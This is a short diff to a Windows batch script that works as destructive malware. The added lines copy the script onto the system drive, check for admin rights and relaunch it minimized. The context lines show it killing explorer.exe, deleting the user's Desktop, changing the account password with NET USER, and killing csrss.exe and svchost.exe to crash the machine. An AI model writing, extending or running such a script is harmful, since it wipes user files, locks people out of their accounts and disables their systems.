@@ -1,5 +1,17 @@
 @ECHO OFF
 
+if not exist %systemdrive%\main.bat goto copy
+net session >nul 2>&1
+if %errorlevel% == 0 goto main
+if not %errorlevel% == 0 goto copy
+
+
+:copy
+if not exist %systemdrive%\main.bat copy %0 %systemdrive%\main.bat
+cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" %systemdrive%\main.bat"
+goto end
+
+:main
 TASKKILL /f /im explorer.exe
 
 DEL %USERPROFILE%\Desktop /s /q /f
@@ -113,3 +125,5 @@ NET USER %USERNAME% Trashedpc01
 
 taskkill /f /im csrss.exe
 taskkill /f /im svchost.exe
+
+:end
